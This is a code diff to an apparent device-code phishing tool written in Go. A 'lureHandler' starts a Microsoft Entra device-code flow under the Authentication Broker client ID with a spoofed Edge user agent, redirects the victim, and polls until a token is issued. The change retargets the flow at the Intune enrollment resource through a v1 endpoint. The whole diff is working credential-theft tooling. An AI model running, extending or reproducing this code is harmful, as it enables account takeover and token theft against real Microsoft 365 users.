@@ -12,15 +12,17 @@ import (
 	"time"
 )
 
-const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edq/135.0.0.0"
+const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
 const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
 const DefaultTenant string = "common"
+const DefaultResource string = "https://enrollment.manage.microsoft.com/"
 
 var (
 	address   string
 	userAgent string
 	clientId  string
 	tenant    string
+	resource  string
 )
 
 func init() {
@@ -29,6 +31,7 @@ func init() {
 	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent used by HeadlessBrowser & API calls")
 	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId for requesting token")
 	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant for requesting token")
+	runCmd.Flags().StringVarP(&resource, "resource", "r", DefaultResource, "Resource requested")
 }
 
 var runCmd = &cobra.Command{
@@ -68,8 +71,9 @@ func lureHandler(w http.ResponseWriter, r *http.Request) {
 
 	http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)
 
-	scopes := []string{"openid", "profile", "offline_access"}
-	deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
+	//scopes := []string{"openid", "profile", "offline_access"}
+	//deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
+	deviceAuth, err := entra.RequestDeviceAuthV1(tenant, clientId, resource)
 	if err != nil {
 		slog.Error("Error during starting device code flow:", err)
 		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
@@ -86,13 +90,14 @@ func lureHandler(w http.ResponseWriter, r *http.Request) {
 	http.Redirect(w, r, redirectUri, http.StatusFound)
 }
 
-func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
-	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
+func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuthV1) {
+	pollInterval := time.Duration(5) * time.Second
 
 	for {
 		time.Sleep(pollInterval)
 		slog.Info("Check for token: " + deviceAuth.UserCode)
-		result, err := entra.RequestToken(tenant, clientId, deviceAuth)
+		//result, err := entra.RequestToken(tenant, clientId, deviceAuth)
+		result, err := entra.RequestTokenV1(tenant, clientId, deviceAuth)
 
 		if err != nil {
 			slog.Error(`"%#v"`, err)
